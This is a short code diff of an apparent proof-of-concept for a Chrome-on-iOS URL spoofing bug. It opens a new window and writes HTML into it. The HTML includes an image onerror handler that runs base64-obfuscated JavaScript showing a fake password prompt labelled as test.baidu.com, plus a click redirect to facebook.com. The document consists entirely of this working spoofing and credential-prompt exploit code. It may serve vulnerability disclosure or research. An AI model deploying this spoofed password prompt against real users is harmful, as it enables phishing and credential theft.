@@ -10,8 +10,9 @@
 	<script>
 	    pwn = () => {
 	        x = open('', 'win');
+			x.document.write('<body onclick=document.location="http://www.facebook.com" />')
 	        setTimeout(`
-	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><body onclick=document.location="http://www.facebook.com" /><h2>Chrome URL spoofing vulnerability on IOS</h2>');
+	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><h2>Chrome URL spoofing vulnerability on IOS</h2>');
 	            `, 1000);
 	        setTimeout(`
 	            `, 2300);
